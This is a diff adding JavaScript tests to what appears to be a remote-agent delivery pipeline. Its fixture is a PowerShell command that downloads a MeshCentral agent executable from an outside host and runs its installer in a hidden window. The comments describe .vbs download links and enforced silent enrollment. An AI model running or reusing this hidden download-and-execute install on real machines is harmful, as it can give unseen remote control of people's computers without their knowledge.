@@ -434,3 +434,39 @@ test("stage 2.1: an oversized command fails closed at MINT (command_too_long); m
     "expected marker_collision",
   );
 });
+
+// ---------------------------------------------------------------------------
+// TASK_231 — mesh-only public installs must pass the carrier pipeline
+// untouched (incident 2026-10-19: `enroll_not_found` on "Download .vbs" and
+// `link_resolution_failed` on /link/vantra/<token> — the TASK_178 silent
+// stage assumed a Tactical `-m install` argv; the TASK_230 mesh-only public
+// installer has none, and needs none: the service agent's `-install` is
+// inherently GUI-less).
+// ---------------------------------------------------------------------------
+
+const MESH_INSTALL_PS = [
+  `$ErrorActionPreference = 'Stop'`,
+  `$ProgressPreference = 'SilentlyContinue'`,
+  `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`,
+  `$exe = Join-Path $env:TEMP 'meshagent64.exe'`,
+  `Invoke-WebRequest -Uri "https://mesh.instaweb.top/meshagents?id=4&meshid=0123ABCDEF" -OutFile $exe -UseBasicParsing`,
+  `Start-Process -FilePath $exe -ArgumentList '-install' -WindowStyle Hidden -Wait`,
+  `Remove-Item $exe -Force -ErrorAction SilentlyContinue`,
+  `'MeshCentral agent installed.'`,
+].join("\n");
+
+test("TASK_231: mesh agent install command passes ensureSilentEnroll byte-identical", () => {
+  assert.equal(ensureSilentEnroll(MESH_INSTALL_PS), MESH_INSTALL_PS);
+});
+
+test("TASK_231: flattened mesh command (carrier normalise output) also passes", () => {
+  // The mint chain calls normalizePowerShellCommand first (newlines → spaces);
+  // the mesh branch must still recognise the flattened form.
+  const flat = MESH_INSTALL_PS.replace(/\n/g, " ");
+  assert.equal(ensureSilentEnroll(flat), flat);
+});
+
+test("TASK_231: non-mesh commands still fail closed on missing -m install (regression pin)", () => {
+  assert.throws(() => ensureSilentEnroll("Invoke-WebRequest -Uri 'https://x'"), /enroll_not_found/);
+});
+
